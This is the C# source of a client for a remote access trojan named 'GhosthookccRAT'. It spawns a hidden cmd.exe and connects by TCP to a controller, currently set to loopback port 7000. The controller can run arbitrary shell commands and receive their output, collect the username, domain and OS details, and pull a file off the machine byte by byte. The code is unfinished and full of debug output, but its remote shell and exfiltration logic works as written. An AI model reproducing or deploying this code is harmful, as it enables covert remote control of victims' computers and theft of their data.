using System;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;

namespace GhosthookccRAT
{
    class Start_CMD
    {
        public static Process cmd = new Process();
        public static Process getProcessData()
        {
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.UseShellExecute = false;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardError = true;

            cmd.Start();

            return cmd;
        }
    }

    public class Socket_Tasks
    {
        public static string GetEncoding(string filename)
        {
            // Read the BOM
            var bom = new byte[4];
            using (var file = new FileStream(filename, FileMode.Open, FileAccess.Read))
            {
                file.Read(bom, 0, 4);
            }

            // Analyze the BOM
            if (bom[0] == 0x2b && bom[1] == 0x2f && bom[2] == 0x76) return "UTF7";
            if (bom[0] == 0xef && bom[1] == 0xbb && bom[2] == 0xbf) return "UTF8";
            if (bom[0] == 0xff && bom[1] == 0xfe && bom[2] == 0 && bom[3] == 0) return "UTF32"; //UTF-32LE
            if (bom[0] == 0xff && bom[1] == 0xfe) return "Unicode"; //UTF-16LE
            if (bom[0] == 0xfe && bom[1] == 0xff) return "BigEndianUnicode"; //UTF-16BE
            if (bom[0] == 0 && bom[1] == 0 && bom[2] == 0xfe && bom[3] == 0xff) return "UTF32BE"; //UTF-32BE

            // We actually have no idea what the encoding is if we reach this point, so
            // you may wish to return null instead of defaulting to ASCII
            return "ASCII";
        }

        Task[] tasks = new Task[1];
        public static Process cmd = Start_CMD.getProcessData();

        public static StreamWriter wStream = cmd.StandardInput;
        public static StreamReader oStream = cmd.StandardOutput;
        public static StreamReader eStream = cmd.StandardError;

        public static int message_count = 0;

        List<string> ExecuteCommand(string command, string endchar, Socket sender, byte[] buffer)
        {
            string datastring = "";

            StreamReader iobuffer = oStream;

            wStream.WriteLine(command);
            wStream.WriteLine(endchar);
            wStream.Flush();

            List<string> stream = new List<string>();
            List<string> streambytes = new List<string>();
            List<string> splitDataString = new List<string>();

            string streambyte;

            while (true)
            {
                streambyte = iobuffer.ReadLine();

                if (streambyte.EndsWith(endchar))
                {
                    break;
                }
                else
                {
                    streambytes.Add(streambyte);
                }
            }

            for (int i = 0; i < streambytes.Count; i++)
            {
                stream.Add(streambytes[i] + " \n");
            }

            for (int xz = 0; xz < stream.Count; xz++)
            {
                datastring += stream[xz];
            }

            splitDataString = datastring.Split(command).ToList();

            return splitDataString;
        }

        public async Task ReceivePackets(Socket sender, byte[] buffer)
        {
            string data = null;

            await sender.ReceiveAsync(buffer, SocketFlags.None);
            data = Encoding.ASCII.GetString(buffer).Replace("\0", "");

            message_count += 1;

            // if(data.Substring(0, 4) == "exec" && message_count == 1)
            //     remove start string of cmd and do other formatting to get a well formatted string...

            if (data == "WHEREAMI")
            {
                Console.WriteLine("WHEREAMI : " + data);

                string myPathVar = ExecuteCommand("echo %CD%", "<EOPATH>", sender, buffer)[1].Replace("\n", "");

                await SendPackets(myPathVar, sender, buffer);
            }
            else if (data.EndsWith("REPLY"))
            {
                data = data.Replace("REPLY", "");

                if (data == "STARTPACKET")
                {
                    ExecuteCommand("whoami", "<STARTPACKET>", sender, buffer);

                    var osInformation = "";

                    if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                    {
                        osInformation += "PROCESSOR ARCHITECTURE : " + Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE") + "\n";
                    }

                    osInformation += "OS VERSION : " + Environment.OSVersion + "\n";
                    osInformation += "OS ARCHITECTURE : " + RuntimeInformation.OSArchitecture + "\n";
                    osInformation += "SYSTEM DIRECTORY : " + Environment.SystemDirectory + "\n";
                    osInformation += "COMPUTER USERNAME : " + Environment.UserName + "\n";
                    osInformation += "COMPUTER USERNAME DOMAIN : " + Environment.UserDomainName + "\n";
                    osInformation += "VERSION : " + Environment.Version;

                    await SendPackets(osInformation, sender, buffer);
                }

                else if (data.Substring(0, 4) == "exec")
                {
                    data = data.Replace("exec ", "");
                    Console.WriteLine("EXEC : " + data);

                    try
                    {
                        await SendPackets(ExecuteCommand(data, "<EOC>", sender, buffer)[1], sender, buffer);
                    } catch (Exception) { }
                }

                else if (data.Substring(0, 7) == "getfile")
                {
                    data = data.Replace("getfile ", "");
                    Console.WriteLine("GETFILE : " + data);

                    if(File.Exists(@"C:/xampp/xampp_start.exe"))
                    {
                        int counter = 0;
                        bool[] nullbytes = new bool[3];

                        Console.WriteLine("This is indeed a file!\n");

                        FileStream file = File.OpenRead(@"C:/xampp/xampp_start.exe");
                        // int filedata = file.ReadByte();

                        IEnumerable<string> filedata = File.ReadLines(@"C:/xampp/xampp_start.exe");
                        // IEnumerable<string> filedata = File.ReadLines(@"C:/autoinst.log");

                        foreach(string line in filedata)
                        {
                            if (counter < 3)
                            {
                                if (line.Contains(Convert.ToChar(0x0).ToString()))
                                {
                                    nullbytes[counter] = true;
                                    counter += 1;
                                }
                            } 
                            else
                            {
                                break; 
                            } 
                        }

                        if(counter == 3)
                        {
                            string filename = Path.GetFileNameWithoutExtension(file.Name);
                            string extension = Path.GetExtension(file.Name);

                            string encoding = GetEncoding(file.Name);

                            Console.WriteLine("Found : " + filename + extension);

                            BinaryReader fileReader = new BinaryReader(file);
                            List<byte> alldata = new List<byte>();

                            while(fileReader.BaseStream.Position != fileReader.BaseStream.Length)
                            {
                                alldata.Add(fileReader.ReadByte());
                            }

                            string filesize = file.Length.ToString();
                            filename += extension;

                            string fileinfo = $"type<binary> name<{filename}> encoding<{encoding}> size<{filesize}>";

                            file.Close();

                            await SendPackets(fileinfo, sender, buffer);

                            foreach (byte chunk in alldata)
                            {
                                await SendPackets(chunk.ToString(), sender, buffer);
                            }
                        } 
                        else
                        {
                            Console.WriteLine("NOT SDASDASD");
                        }
                    }
                }
            }

            else if (data.EndsWith("NOREPLY"))
            {
                data = data.Replace("NOREPLY", "");
                Console.WriteLine("NOREPLY : " + data);
            }

            else
            {
                Console.WriteLine("UNKNOWN : " + data);

                await SendPackets("The packet you sent was unknown!", sender, buffer);
            }

            Array.Clear(buffer, 0, buffer.Length);
        }

        public async Task SendPackets(string input, Socket sender, byte[] buffer)
        {
            await sender.SendAsync(Encoding.ASCII.GetBytes(input), SocketFlags.None);
        }

        public async Task prepack(Socket sender, byte[] buffer)
        {
            string stringBuffer = "";
            for (int i = 0; i < 10025; i++)
            {
                stringBuffer += "p";
            }

            await sender.SendAsync(Encoding.ASCII.GetBytes(stringBuffer), SocketFlags.None);
        }

        public async Task Handle()
        {
            const int BUFFER_SIZE = 1024;
            byte[] buffer = new byte[BUFFER_SIZE];

            IPAddress ip = IPAddress.Loopback;
            IPEndPoint RemoteEP = new IPEndPoint(ip, 7000);

            Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            await sender.ConnectAsync(RemoteEP);

            // Task RecvTask = Task.Run(() => ReceivePackets(sender, buffer));
            while (true)
            {
                await ReceivePackets(sender, buffer);
            }
        }
    }

    class Client
    {
        static async Task Main(string[] args)
        {
            Socket_Tasks senderHandle = new Socket_Tasks();
            await senderHandle.Handle();
        }
    }
}

